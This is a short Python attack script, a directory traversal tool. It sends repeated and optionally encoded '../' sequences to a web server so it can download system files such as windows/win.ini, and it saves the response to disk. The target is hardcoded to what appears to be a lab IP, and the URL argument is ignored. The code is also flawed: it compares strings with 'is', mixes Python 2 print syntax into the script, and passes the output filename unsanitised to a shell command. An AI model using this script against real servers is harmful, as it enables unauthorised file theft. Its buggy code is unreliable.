import sys
import requests
import os
import time
import argparse

#Parse through cmd line arguments
parser = argparse.ArgumentParser(description='Dynamic Directory Traversal Tool')

parser.add_argument('-r', type=int, help="Number of '../' repetitions in attack, default 7")
parser.add_argument('-u', help="URL to attack")
parser.add_argument('-o', help="output file")
parser.add_argument('-f', help="File to download from server ex: windows/win.ini")
parser.add_argument('-e', help="Encode traversal string to hexadecimal (f=full, d=dots, s=slash, b=backslash, u=unicode)")

args = parser.parse_args()

#Check arguments for null values
if args.u is None: sys.exit('No URL Specified. (-u)')
if args.f is None: sys.exit('No Server File Specified to Download. (-f)')
if args.r is None: args.r = 7
if args.o is None: args.o = 'out'


#Creating ../ using usr repetitions/encoding
traversal = ""
enc = "../"

if args.e is 'f': enc = "%2e%2e%2f"
elif args.e is 'd': enc = "%2e%2e/"
elif args.e is 's': enc = "..%2f"
elif args.e is 'b': enc = "%2e%2e%5c"
elif args.e is 'u': enc = "..%c0%af"

for i in range(0,args.r):
  traversal += enc

#Construct attack and print for usr
attack = "http://10.10.10.184/Pages"+traversal+args.f
print('Attack constructed: ' + attack)

#Send to server and attempt directory traversal
content = requests.get(attack)

#Check if successful
if content.status_code == 200:
  print "Directory Traversal Succeeded"
  print "Saving Output"

  #Create new file and write downloaded data
  os.system("touch " + args.o)
  out = open(args.o,"r+")
  out.write(content.text)
  out.close()

#Fails
else:

  print "Did not work."

